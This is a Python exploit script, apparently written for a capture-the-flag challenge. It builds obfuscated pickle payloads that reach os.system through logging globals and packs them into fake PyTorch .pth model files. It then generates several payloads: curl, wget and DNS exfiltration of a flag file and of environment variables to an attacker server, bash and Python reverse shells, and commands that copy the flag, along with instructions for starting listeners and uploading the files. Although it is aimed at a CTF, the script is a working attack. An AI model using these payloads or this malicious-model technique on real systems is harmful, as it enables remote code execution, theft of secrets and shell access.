#!/usr/bin/env python3
"""
LilacCTF Nailong2 - Data Exfiltration Payloads
Since the web app may not show command output, use these methods to exfil the flag:

1. curl/wget to your server
2. DNS exfiltration 
3. Reverse shell
"""

import pickle
import pickletools
import struct
import io
import zipfile
import sys

# Opcodes
PROTO = b'\x80'
GLOBAL = b'c'
REDUCE = b'R'
MARK = b'('
TUPLE = b't'
EMPTY_TUPLE = b')'
STOP = b'.'
SHORT_BINUNICODE = b'\x8c'
BINUNICODE = b'X'
BINGET = b'h'
BINPUT = b'q'


def pack_str(s: str) -> bytes:
    encoded = s.encode('utf-8')
    if len(encoded) < 256:
        return SHORT_BINUNICODE + bytes([len(encoded)]) + encoded
    return BINUNICODE + struct.pack('<I', len(encoded)) + encoded


def build_payload(command: str) -> bytes:
    """Build payload using logging.__globals__['os'].system"""
    hex_os = b'os'.hex()
    hex_system = b'system'.hex()
    hex_globals = b'__globals__'.hex()
    
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # Build 'os' string
    p.write(GLOBAL + b'codecs\ndecode\n')
    p.write(MARK)
    p.write(pack_str(hex_os))
    p.write(pack_str('hex'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x00')
    
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x00')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x01')  # 'os'
    
    # Build 'system'
    p.write(GLOBAL + b'codecs\ndecode\n')
    p.write(MARK)
    p.write(pack_str(hex_system))
    p.write(pack_str('hex'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x02')
    
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x02')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x03')  # 'system'
    
    # Build '__globals__'
    p.write(GLOBAL + b'codecs\ndecode\n')
    p.write(MARK)
    p.write(pack_str(hex_globals))
    p.write(pack_str('hex'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x04')
    
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x04')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x05')  # '__globals__'
    
    # logging.getLogger
    p.write(GLOBAL + b'logging\ngetLogger\n')
    p.write(BINPUT + b'\x06')
    
    # getattr(logging.getLogger, '__globals__')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x06')
    p.write(BINGET + b'\x05')
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x07')
    
    # __globals__['os']
    p.write(GLOBAL + b'operator\ngetitem\n')
    p.write(MARK)
    p.write(BINGET + b'\x07')
    p.write(BINGET + b'\x01')
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x08')
    
    # getattr(os, 'system')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x08')
    p.write(BINGET + b'\x03')
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x09')
    
    # Call system(command)
    p.write(BINGET + b'\x09')
    p.write(MARK)
    p.write(pack_str(command))
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def create_pytorch_zip(pickle_payload: bytes, output_path: str):
    """Create valid PyTorch model file"""
    zip_buffer = io.BytesIO()
    
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_STORED) as zf:
        zf.writestr('archive/version', '3')
        zf.writestr('archive/data.pkl', pickle_payload)
    
    with open(output_path, 'wb') as f:
        f.write(zip_buffer.getvalue())
    
    print(f"[+] Saved: {output_path}")


def main():
    print("""
==============================================
   LilacCTF Nailong2 - Exfiltration Payloads
==============================================

请根据你的环境修改以下配置:
""")
    
    # =================== 配置区域 ===================
    # 方法1: HTTP 外传 (需要你的 VPS)
    YOUR_VPS_IP = "YOUR_VPS_IP"
    YOUR_VPS_PORT = "8000"
    
    # 方法2: DNS 外传 (需要你控制的域名或使用公共 DNS Logger)
    YOUR_DOMAIN = "YOUR.dnslog.cn"  # 可用 dnslog.cn, burpcollaborator 等
    
    # 方法3: 反弹 Shell
    REVERSE_SHELL_IP = "YOUR_VPS_IP"
    REVERSE_SHELL_PORT = "9999"
    # =================== 配置结束 ===================
    
    payloads = []
    
    # 1. curl 外传 (base64 编码)
    cmd_curl = f"curl http://{YOUR_VPS_IP}:{YOUR_VPS_PORT}/$(cat /flag|base64|tr -d '\\n')"
    payloads.append(("exfil_curl.pth", cmd_curl, "HTTP exfil via curl"))
    
    # 2. wget 外传
    cmd_wget = f"wget http://{YOUR_VPS_IP}:{YOUR_VPS_PORT}/$(cat /flag|base64|tr -d '\\n')"
    payloads.append(("exfil_wget.pth", cmd_wget, "HTTP exfil via wget"))
    
    # 3. DNS 外传 (flag 作为子域名)
    cmd_dns = f"nslookup $(cat /flag|tr -d '\\n'|cut -c1-60).{YOUR_DOMAIN}"
    payloads.append(("exfil_dns.pth", cmd_dns, "DNS exfil"))
    
    # 4. 反弹 Shell (bash)
    cmd_revshell_bash = f"bash -c 'bash -i >& /dev/tcp/{REVERSE_SHELL_IP}/{REVERSE_SHELL_PORT} 0>&1'"
    payloads.append(("revshell_bash.pth", cmd_revshell_bash, "Bash reverse shell"))
    
    # 5. 反弹 Shell (python)
    cmd_revshell_py = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{REVERSE_SHELL_IP}\",{REVERSE_SHELL_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    payloads.append(("revshell_python.pth", cmd_revshell_py, "Python reverse shell"))
    
    # 6. 读取 flag 并写入 public 目录 (如果是 web 应用)
    cmd_write = "cp /flag /app/static/flag.txt 2>/dev/null || cp /flag /var/www/html/flag.txt 2>/dev/null || cp /flag /tmp/flag.txt"
    payloads.append(("write_flag.pth", cmd_write, "Copy flag to web dir"))
    
    # 7. 简单测试命令
    cmd_test = "id;uname -a;cat /flag"
    payloads.append(("test_basic.pth", cmd_test, "Basic test commands"))
    
    # 8. 通过环境变量获取 (有些 CTF 会把 flag 放在环境变量)
    cmd_env = f"curl http://{YOUR_VPS_IP}:{YOUR_VPS_PORT}/$(env|base64|tr -d '\\n')"
    payloads.append(("exfil_env.pth", cmd_env, "Exfil environment variables"))
    
    print("\n[*] 生成的 Payloads:")
    print("-" * 60)
    
    for filename, cmd, desc in payloads:
        print(f"\n[*] {desc}")
        print(f"    Command: {cmd[:80]}...")
        payload = build_payload(cmd)
        create_pytorch_zip(payload, filename)
    
    print("\n" + "=" * 60)
    print("""
使用说明:
---------
1. 修改脚本顶部的 YOUR_VPS_IP, YOUR_DOMAIN 等配置
2. 重新运行脚本生成 payload
3. 在你的 VPS 上启动监听:
   - HTTP: python3 -m http.server 8000
   - 反弹 Shell: nc -lvnp 9999
   
4. 上传生成的 .pth 文件到目标

推荐尝试顺序:
1. test_basic.pth - 确认 RCE 成功
2. exfil_curl.pth 或 exfil_wget.pth - HTTP 外传
3. revshell_bash.pth - 如果需要交互式 shell
""")


if __name__ == "__main__":
    main()
